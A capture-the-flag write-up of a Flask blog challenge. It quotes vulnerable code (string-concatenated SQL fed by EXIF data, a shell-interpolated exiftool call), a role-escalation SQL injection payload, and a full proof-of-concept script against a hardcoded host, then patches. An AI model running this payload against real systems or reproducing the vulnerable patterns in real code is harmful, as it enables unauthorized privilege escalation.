---
layout: challenge.njk
title: Blogpost
category: Web
part: Final
author: 3G0
description: "A Flask blogging app whose post-metadata handling is built from unsafe string-concatenated SQL fed by EXIF data — privilege-escalate to admin to read the flag."
attachments:
  - { name: app.py, path: /files/final/blogpost/app.py }
  - { name: init_db.sql, path: /files/final/blogpost/init_db.sql }
  - { name: poc.py, path: /files/final/blogpost/poc.py }
  - { name: Dockerfile, path: /files/final/blogpost/Dockerfile }
  - { name: docker-compose.yml, path: /files/final/blogpost/docker-compose.yml }
  - { name: requirements.txt, path: /files/final/blogpost/requirements.txt }
tags: [sqli, flask, exiftool, privilege-escalation]
---

## Recon

We are given a RAR archive that extracts to the source code for the **Blogpost** challenge. It is a
Python/Flask application that lets a user register, log in, create posts (with an image upload),
view posts, and view a profile.

![Blogpost login page](/img/blogpost/login.png)

The profile page is interesting because it displays the user's **role**:

![Blogpost profile page showing the role](/img/blogpost/profile.png)

Looking at `app.py`, the `/profile` route reveals why the role matters — the flag is returned only
when the current user's role is `admin`, and the profile is rendered with
`render_template_string`:

```python
@app.route("/profile")
def profile():
    if "user_id" not in session:
        flash("Login required")
        return redirect(url_for("login"))
    db = get_db()
    cur = db.execute("SELECT id, username, role FROM users WHERE id = ?", (session["user_id"],))
    user = cur.fetchone()
    flag_content = None

    with open(os.path.join(APP_DIR, "templates", "profile.html"), "r", encoding="utf-8") as fh:
        profile_template = fh.read()

    username = user["username"] if user else ""
    profile_source = profile_template.replace("{{ user.username }}", username)

    if user and user["role"] == "admin":
        try:
            with open(FLAG_PATH, "r") as f:
                flag_content = f.read().strip()
        except Exception:
            flag_content = "flag not found"
    return render_template_string(profile_source, user=user, flag=flag_content)
```

## SQL Injection

The vulnerability is in how post metadata is written. After inserting a post, the app builds an
`UPDATE` with the metadata **string-concatenated** into the SQL and runs it with `executescript`:

```python
cur = db.execute(
    "INSERT INTO posts (title, content, image_filename, author_id) VALUES (?, ?, ?, ?)",
    (title, content, image_filename, session['user_id'])
)
db.commit()
post_id = cur.lastrowid
metadata_insert = f"UPDATE posts SET metadata = '{metadata_text}' WHERE id = {post_id};"
db.executescript(metadata_insert)
db.commit()
```

`metadata_text` comes from the output of `exiftool` run against the uploaded image. Since
`executescript` executes multiple statements, if we can smuggle a quote and a second statement into
the EXIF metadata, we can run arbitrary SQL — including flipping our own role to `admin`:

```python
sqli_payload = f"dummy'; UPDATE users SET role = 'admin' WHERE username = '{username}'; --"
```

## Unsafe exiftool (RCE surface)

The metadata is generated with a shell-interpolated command, which is a classic command-injection
surface as well:

```python
cmd = f"exiftool {save_path}"
meta_file = save_path + ".meta"
full_cmd = f"{cmd} > {meta_file} 2>&1"
os_status = os.system(full_cmd)
```

We did not end up weaponizing this into full RCE, so during the patch phase this part is simply
hardened (see below).

## Exploitation

The exploit crafts a PNG whose EXIF `Comment` carries the SQL-injection payload, then
registers/logs in, uploads it, and reads `/profile`:

```python
#!/usr/bin/env python3
"""
SQL Injection PoC - Privilege Escalation to Admin
Target: Flask application with EXIF metadata SQL injection
"""
import requests, subprocess, os, io
from PIL import Image

TARGET_URL = "http://54.151.150.157:10000/"
USERNAME = "bruh23111"
PASSWORD = "bruh23111"

def create_malicious_image(username):
    img = Image.new('RGB', (100, 100), color='blue')
    temp_file = "malicious_image.png"
    img.save(temp_file)
    # Breaks out of: UPDATE posts SET metadata = '{payload}' WHERE id = {post_id};
    sqli_payload = f"dummy'; UPDATE users SET role = 'admin' WHERE username = '{username}'; --"
    cmd = ['exiftool', f'-Comment={sqli_payload}', '-overwrite_original', temp_file]
    subprocess.run(cmd, check=True, capture_output=True)
    with open(temp_file, 'rb') as f:
        data = f.read()
    os.remove(temp_file)
    return data

def register(session, u, p):
    session.post(f"{TARGET_URL}/register", data={'username': u, 'password': p}, allow_redirects=False)

def login(session, u, p):
    session.post(f"{TARGET_URL}/login", data={'username': u, 'password': p}, allow_redirects=True)

def exploit(session, username):
    img = create_malicious_image(username)
    files = {'image': ('exploit.png', img, 'image/png')}
    data = {'title': 'Test Post', 'content': 'Testing SQL injection'}
    session.post(f"{TARGET_URL}/create", files=files, data=data, allow_redirects=True)

def main():
    session = requests.Session()
    register(session, USERNAME, PASSWORD)
    login(session, USERNAME, PASSWORD)
    exploit(session, USERNAME)
    print(session.get(f"{TARGET_URL}/profile").text)

if __name__ == "__main__":
    main()
```

Running the PoC uploads the malicious image; the injected `UPDATE users SET role = 'admin'` executes
via `executescript`, and the account is elevated to admin:

```text
[*] Creating and uploading malicious image...
[+] Created malicious image with SQL injection payload
[+] Payload: dummy'; UPDATE users SET role = 'admin' WHERE username = 'aduh_nt_gemastik'; --
[+] Image uploaded successfully
[+] SQL injection should have executed!

[*] Checking admin access...
[+] We are admin but flag not found in response

[+] Exploitation successful!
```

> On the local docker-compose instance the flag file is empty, so the profile shows the admin role
> without a flag value. Against the live challenge machine (just swap the host/port), the same admin
> role unlocks the flag on the `/profile` page.

## Patch

Recon surfaced two vulnerabilities: the SQL injection and the unsafe `exiftool` call.

**SQL injection** — use a parameterized `UPDATE` instead of string concatenation:

```python
cur = db.execute(
    "INSERT INTO posts (title, content, image_filename, author_id) VALUES (?, ?, ?, ?)",
    (title, content, image_filename, session['user_id'])
)
db.commit()
post_id = cur.lastrowid
db.execute("UPDATE posts SET metadata = ? WHERE id = ?", (metadata_text, post_id))
db.commit()
```

**Unsafe exiftool** — avoid the shell entirely so nothing but `exiftool` can be executed:

```python
meta_file = save_path + ".meta"
try:
    with open(meta_file, "w") as mf:
        subprocess.run(["exiftool", save_path], stdout=mf, stderr=subprocess.STDOUT, timeout=5)
except Exception:
    ...
```
